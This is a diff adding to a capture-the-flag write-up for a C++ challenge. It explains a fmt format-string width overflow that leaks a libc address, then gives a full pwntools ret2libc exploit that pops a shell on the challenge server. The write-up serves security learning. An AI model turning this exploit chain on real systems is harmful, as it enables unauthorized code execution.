@@ -65,9 +65,83 @@ Looking at the protections enabled (can be inferred from the compiler arguments 
 This confirmed that buffer overflow was imminent.
 
 ### Exploitation
-After finding the format string and buffer overflow vulnerabilities, I was looking for a leak to do a `ret2libc` attack. I thought we could leak the stack contents like we do in C `printf` format string attacks. I pulled up the C++ does for the `fmt::format_to` function and was reading the format string syntax. It uses a syntax similar to Python's str.format function.
+After finding the format string and buffer overflow vulnerabilities, I was looking for a leak to do a `ret2libc` attack. I thought we could leak the stack contents like we do in C `printf` format string attacks. I pulled up the C++ does for the `fmt::format_to` function and was reading the format string syntax. It uses a syntax similar to Python's `str.format` function.
 I tried giving indices to read arguments beyond the provided one (still under the impression that it was similar to `printf` format string).
 
 After attempting multiple indices and types (you can specify the type being printed in the format), the program wasn't letting me print any argument other than the first argument and that only in integer format. The issue was that C++ does runtime checks for verifying argument's indices and types with the ones that we provided during compilation, unlike `printf` that has no runtime checks because it has no runtime type information.
 
 At this point the first hint was released, that read "_The format documentation is quite extensive. You just need to look into expansions_". Expansions are same as those of `printf`. We specify a width of the argument being printed and the value is padding with space (default) or the specified character from the left (default) or the right to make the string have the specified width.
+Example expansions:
+`printf`: `%<offset>$<width><specifier>`, `%2$20d`, `%20d`, `%-20s`
+`fmt`: `{<offset>:<width><specifier>}`, `{2:20d}`, `{:20d}`, `{:-20s}`
+
+With this in mind, I experimented with a few different widths and found out that there were no bound checks on the `output` buffer, so we can overflow `output` and `fmt` wasn't performing any string termination either. Looking at the stack in `gdb`, you get the following layout:
+```
+[output buffer]
+[buf_2 buffer]
+[buf buffer]
+[saved rbp]
+[return address]
+```
+This reminded me that there is a libc leak present in `buf_2`, I overflowed `output` with `{:256}` and got the following output:
+```
++ {:256}
+                                                                                                                                                                                                                                                              800x78ea92c88540
+++
+```
+The address at the end is `setvbuf`. Now we have libc base and just need to perform buffer overflow in `buf` buffer, thanks to buffer overflow in `safe_str_input` function.
+I did a simple `ret2libc` attack to execute `system` function
+
+### Final Exploit
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+def start() -> tube:
+    if args.REMOTE:
+        return remote("challs.airoverflow.com", 32297)
+    else:
+        return elf.process()
+    
+def attach_gdb() -> None:
+    if args.REMOTE or args.NOGDB:
+        return
+    
+    gdb.attach(p, '''
+    b *main +730
+    continue
+               ''')
+    input("ATTACHED?")
+
+context.binary = elf = ELF("./plusplus_patched")
+libc = elf.libc
+
+POP_RDI = 0x000000000010f75b
+RET = POP_RDI + 1
+BIN_SH = 0x1cb42f
+
+p = start()
+
+p.sendlineafter("+ ", "{:256}")
+libc_leak = int(p.recvline().strip()[2:], 0x10)
+
+libc.address = libc_leak - libc.sym.setvbuf
+
+print(hex(libc.address))
+
+rop = [
+    libc.address + POP_RDI, libc.address + BIN_SH,
+    libc.address + RET,
+    libc.sym.system
+]
+
+attach_gdb()
+
+p.sendlineafter("++ ", b'A'*440 + b''.join([p64(x) for x in rop]))
+
+p.interactive()
+p.close()
+```
+
+### Comments
+I really liked the idea of the challenge to show that format string are not limited to C's `printf` and can be helpful even with strict type-checking.
